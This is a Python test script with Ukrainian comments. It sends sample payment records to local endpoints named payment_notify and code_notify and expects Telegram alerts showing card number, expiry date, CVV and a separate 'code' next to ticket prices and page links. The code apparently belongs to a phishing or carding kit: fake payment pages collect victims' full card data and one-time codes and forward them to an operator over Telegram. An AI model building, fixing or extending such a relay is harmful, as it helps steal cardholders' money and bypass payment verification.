#!/usr/bin/env python3
"""
Тестовий скрипт для перевірки виправлення проблеми з Total
"""

import requests
import json
import time

def test_payment_notify_with_total():
    """Тестує payment_notify з total сумою"""
    print("🧪 Тестування payment_notify з Total...")
    
    try:
        # Тестуємо через /send_payment_data endpoint
        data = {
            'page_code': '2-8',  # Тестовий page_code
            'name': 'Test User',
            'phone': '+1234567890',
            'email': 'test@example.com',
            'card': '4111111111111111',
            'expiry': '12/25',
            'cvv': '123',
            'ip': '127.0.0.1',
            'price': '45',      # Базова ціна за один квиток
            'total': '90',      # Загальна сума за всі квитки
            'currency': 'EUR'
        }
        
        print(f"   Відправляємо дані: {data}")
        
        response = requests.post('http://127.0.0.1:8081/payment_notify', json=data, timeout=5)
        print(f"   Відповідь: {response.status_code} - {response.text}")
        
        if response.status_code == 200:
            print("   ✅ payment_notify прийняв дані з Total")
            print("   📱 Перевірте Telegram:")
            print("   🔍 Має бути:")
            print("      💰 Общая сумма: 90 EUR (Total, замість 45!)")
            print("      #️⃣ Ссылка: ?page=2-8")
            print("      💳 Номер карты: 4111111111111111")
            print("      📅 Срок действия: 12/25")
            print("      🔐 CVV: 123")
        else:
            print("   ❌ payment_notify не прийняв дані")
            
    except Exception as e:
        print(f"   ❌ Помилка: {e}")

def test_payment_notify_without_total():
    """Тестує payment_notify без total суми (fallback до price)"""
    print("\n🧪 Тестування payment_notify без Total (fallback)...")
    
    try:
        data = {
            'page_code': '2-9',
            'name': 'Test User 2',
            'phone': '+1234567891',
            'email': 'test2@example.com',
            'card': '5555555555554444',
            'expiry': '03/26',
            'cvv': '456',
            'ip': '127.0.0.2',
            'price': '50',      # Тільки базова ціна
            'currency': 'USD'
            # total відсутній
        }
        
        print(f"   Відправляємо дані: {data}")
        
        response = requests.post('http://127.0.0.1:8081/payment_notify', json=data, timeout=5)
        print(f"   Відповідь: {response.status_code} - {response.text}")
        
        if response.status_code == 200:
            print("   ✅ payment_notify прийняв дані без Total")
            print("   📱 Перевірте Telegram:")
            print("   🔍 Має бути:")
            print("      💰 Общая сумма: 50 USD (fallback до price)")
            print("      #️⃣ Ссылка: ?page=2-9")
        else:
            print("   ❌ payment_notify не прийняв дані")
            
    except Exception as e:
        print(f"   ❌ Помилка: {e}")

def test_code_notify_with_total():
    """Тестує code_notify з total сумою"""
    print("\n🧪 Тестування code_notify з Total...")
    
    try:
        data = {
            'page_code': '2-10',
            'ip': '127.0.0.3',
            'code': 'TEST90',
            'price': '45',      # Базова ціна
            'total': '90',      # Загальна сума
            'currency': 'EUR'
        }
        
        print(f"   Відправляємо дані: {data}")
        
        response = requests.post('http://127.0.0.1:8081/code_notify', json=data, timeout=5)
        print(f"   Відповідь: {response.status_code} - {response.text}")
        
        if response.status_code == 200:
            print("   ✅ code_notify прийняв дані з Total")
            print("   📱 Перевірте Telegram:")
            print("   🔍 Має бути:")
            print("      💰 Сумма: 90 EUR (Total, замість 45!)")
            print("      #️⃣ Ссылка: ?page=2-10")
            print("      🔐 Код: TEST90")
        else:
            print("   ❌ code_notify не прийняв дані")
            
    except Exception as e:
        print(f"   ❌ Помилка: {e}")

if __name__ == '__main__':
    print("🚀 Тестування виправлення проблеми з Total")
    print("=" * 50)
    
    # Тест 1: payment_notify з total
    test_payment_notify_with_total()
    
    time.sleep(2)
    
    # Тест 2: payment_notify без total (fallback)
    test_payment_notify_without_total()
    
    time.sleep(2)
    
    # Тест 3: code_notify з total
    test_code_notify_with_total()
    
    print("\n" + "=" * 50)
    print("✅ Тестування завершено!")
    print("\n📋 Очікувані результати:")
    print("   • З Total: показує загальну суму (90 EUR)")
    print("   • Без Total: показує базову ціну (50 USD)")
    print("   • Всі повідомлення мають 'Общая сумма' замість 'Сумма'")
